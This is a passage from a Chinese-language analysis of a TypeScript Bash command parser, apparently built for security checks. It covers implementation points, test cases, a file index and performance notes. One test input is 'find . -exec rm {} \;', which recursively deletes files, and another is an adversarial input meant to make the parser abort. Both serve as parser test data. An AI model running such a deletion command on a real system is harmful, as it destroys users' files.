    if (name) return name
  }
  return null
}

function walkFor(node: Node, targetType: string): boolean {
  if (node.type === targetType) return true
  return node.children.some(c => walkFor(c, targetType))
}
```

### 8.2 完整实现要点

**关键实现细节：**

1. **UTF-8字节追踪** - tree-sitter兼容性要求
2. **上下文敏感tokenizer** - `[` 在cmd位置是操作符，arg位置是word
3. **引用状态追踪** - 单引号literal，双引号展开
4. **Heredoc延迟扫描** - 分隔符记录，换行后扫描body
5. **预算检查** - 超时/节点上限
6. **三态返回** - Node/null/PARSE_ABORTED

### 8.3 测试验证

**关键测试案例：**
```typescript
// 测试用例
const cases = [
  // 基础命令
  { input: 'echo hello', expected: { command: 'echo', args: ['hello'] } },
  
  // 引用处理
  { input: "echo 'hello world'", expected: { command: 'echo', args: ['hello world'] } },
  
  // 变量赋值
  { input: 'VAR=value echo test', expected: { command: 'echo', envVars: ['VAR=value'] } },
  
  // 管道
  { input: 'cat file | grep pattern', expected: { hasPipeline: true } },
  
  // 命令替换
  { input: 'echo $(date)', expected: { hasCommandSubstitution: true } },
  
  // find -exec边界
  { input: 'find . -exec rm {} \\;', expected: { hasCompoundOperators: false } },
  
  // 对抗性输入
  { input: '(( a[0][0][0]... ))', expected: { shouldAbort: true } },
]
```

---

## 9. 关键文件路径索引

| 文件 | 核心功能 | 行数 |
|------|----------|------|
| `utils/bash/ast.ts` | AST解析入口、安全节点提取 | 231 |
| `utils/bash/parser.ts` | parseCommand/parseCommandRaw | 231 |
| `utils/bash/bashParser.ts` | 纯TypeScript解析器实现 | ~3000 |
| `utils/bash/treeSitterAnalysis.ts` | tree-sitter安全分析 | 507 |
| `utils/bash/ParsedCommand.ts` | IParsedCommand接口实现 | 319 |
| `utils/bash/heredoc.ts` | Heredoc提取/恢复 | 734 |
| `utils/bash/commands.ts` | 命令分割、重定向处理 | ~400 |
| `utils/bash/registry.ts` | 命令规范注册 | 54 |
| `utils/bash/specs/*.ts` | 内置命令规范 | 各~20 |

---

## 10. 性能优化要点

1. **单次遍历收集** - collectQuoteSpans合并5次遍历为1次
2. **惰性字节表** - 仅在非ASCII输入时构建byteTable
3. **增量扫描** - heredoc.ts的advanceScan避免O(n²)重扫描
4. **缓存** - ParsedCommand.ts的size-1缓存避免重复解析
5. **预算检查** - 每128节点检查超时，减少性能调用

---

*Bash命令解析器分析完成*